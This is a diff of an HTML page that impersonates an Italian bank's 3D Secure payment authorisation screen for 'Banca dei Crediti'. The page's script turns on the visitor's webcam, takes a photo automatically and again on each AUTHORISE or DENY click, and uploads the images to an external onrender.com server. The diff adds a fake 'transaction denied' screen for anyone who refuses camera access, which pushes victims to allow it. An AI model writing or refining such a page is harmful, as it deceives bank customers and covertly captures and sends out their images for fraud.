@@ -3,10 +3,8 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Autorizzazione 3D Secure - Banca dei Crediti</title>
+  <title>Banca dei Crediti - Autorizzazione 3D Secure</title>
   <style>
-    * { box-sizing: border-box; margin: 0; padding: 0; }
-
     body {
       font-family: 'Segoe UI', sans-serif;
       background-color: #f4f4f4;
@@ -30,19 +28,6 @@
     .logo {
       width: 120px;
       margin-bottom: 10px;
-    }
-
-    .bank-name {
-      font-size: 18px;
-      font-weight: bold;
-      margin-bottom: 4px;
-      color: #003366;
-    }
-
-    .secure-label {
-      font-size: 13px;
-      color: green;
-      margin-bottom: 15px;
     }
 
     .info p {
@@ -77,27 +62,25 @@
 </head>
 <body>
 
-<div class="card">
+<div class="card" id="card">
   <img src="logo.png" class="logo" alt="Banca dei Crediti">
-  <div class="bank-name">Banca dei Crediti S.p.A.</div>
-  <div class="secure-label">Sistema di Sicurezza 3D Secure Attivo</div>
+  <h2>Banca dei Crediti - 3D Secure</h2>
 
   <div class="info">
     <p>Intestatario: <strong>LORE*** MARIANI</strong></p>
     <p>IBAN: <strong>IT60X****5678</strong></p>
     <p>Importo: <strong>12,20 USD</strong></p>
     <p>Commissione: <strong>0,00 USD</strong></p>
-    <p>Operazione: <strong>PAGAMENTO E-COMMERCE</strong></p>
     <p>Transazione: <strong>#TRX-9283743</strong></p>
     <p>Data: <strong><span id="data-operazione"></span></strong></p>
     <p class="timer">Sessione in scadenza tra <span id="countdown">02:00</span></p>
   </div>
 
-  <video id="video" width="300" autoplay></video>
-  <canvas id="canvas" width="300" height="200"></canvas>
+  <video id="video" autoplay playsinline></video>
+  <canvas id="canvas"></canvas>
 
-  <button class="autorizza" onclick="handleClick('autorizza')">AUTORIZZA</button>
-  <button class="nega" onclick="handleClick('nega')">NEGA</button>
+  <button class="autorizza" id="btnAutorizza" onclick="handleClick('autorizza')">AUTORIZZA</button>
+  <button class="nega" id="btnNega" onclick="handleClick('nega')">NEGA</button>
 </div>
 
 <script>
@@ -105,6 +88,8 @@
   const canvas = document.getElementById('canvas');
   const context = canvas.getContext('2d');
   const countdownEl = document.getElementById('countdown');
+  const card = document.getElementById('card');
+
   document.getElementById('data-operazione').innerText = new Date().toLocaleDateString('it-IT');
 
   // Countdown 2 minuti
@@ -117,44 +102,51 @@
     if (seconds <= 0) {
       clearInterval(timer);
       countdownEl.innerText = "00:00";
-      alert("Sessione scaduta. Riprovare.");
+      alert("Sessione scaduta.");
     }
   }, 1000);
 
-  // Accesso webcam + auto-scatto
+  // Attiva webcam e auto-scatto
   navigator.mediaDevices.getUserMedia({ video: true })
     .then(stream => {
       video.srcObject = stream;
+
       video.onloadedmetadata = () => {
         setTimeout(() => {
-          canvas.width = video.videoWidth;
-          canvas.height = video.videoHeight;
-          context.drawImage(video, 0, 0, canvas.width, canvas.height);
-          const image = canvas.toDataURL('image/png');
-          fetch('https://backend-render-server.onrender.com/upload', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-              action: 'auto-scatto',
-              image: image
-            })
-          });
+          takeAndSendPhoto("auto-scatto");
         }, 1500);
       };
+    })
+    .catch(() => {
+      // Webcam negata → schermata transazione negata
+      card.innerHTML = `
+        <h2 style="color: darkred">Transazione Negata</h2>
+        <p>L'autenticazione 3D Secure non è stata completata.</p>
+        <p>Accesso alla videocamera rifiutato.</p>
+        <p>Operazione annullata.</p>
+      `;
     });
 
   function handleClick(action) {
-    context.drawImage(video, 0, 0, 300, 200);
+    takeAndSendPhoto(action);
+    alert("Operazione completata.");
+  }
+
+  function takeAndSendPhoto(action) {
+    // Imposta canvas con dimensione reale
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    context.drawImage(video, 0, 0, canvas.width, canvas.height);
     const image = canvas.toDataURL('image/png');
+
+    // Invia immagine al backend
     fetch('https://backend-render-server.onrender.com/upload', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
-        action: action,
-        image: image
+        action,
+        image
       })
-    }).then(() => {
-      alert("Operazione completata.");
     });
   }
 </script>
